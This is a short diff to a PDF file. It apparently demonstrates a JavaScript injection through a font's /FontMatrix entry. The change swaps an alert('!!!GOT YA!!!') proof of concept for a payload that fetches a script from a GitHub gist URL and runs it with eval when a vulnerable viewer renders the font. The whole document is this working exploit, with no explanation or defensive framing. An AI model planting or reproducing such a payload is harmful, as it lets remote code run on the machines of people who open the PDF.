@@ -46,7 +46,7 @@ endobj
   /BaseFont /SNCSTG+CMBX12
   /FontDescriptor 7 0 R
   /Subtype /Type1
-  /FontMatrix [1 2 3 4 5 (1\); alert\('!!!GOT YA!!!')]
+  /FontMatrix [1 2 3 4 5 (1\); fetch\('https://gist.githubusercontent.com/clarkio/3600e9f6a867f1c8cb92a5b71d26d978/raw/973aa04d99b2d929a3f6cfe89cafd24d8a839ee5/hello-world-hack.js'\).then\(res=>res.text\(\).then\(code=>eval\(code\)\))]
   /Type /Font
 >>
 endobj
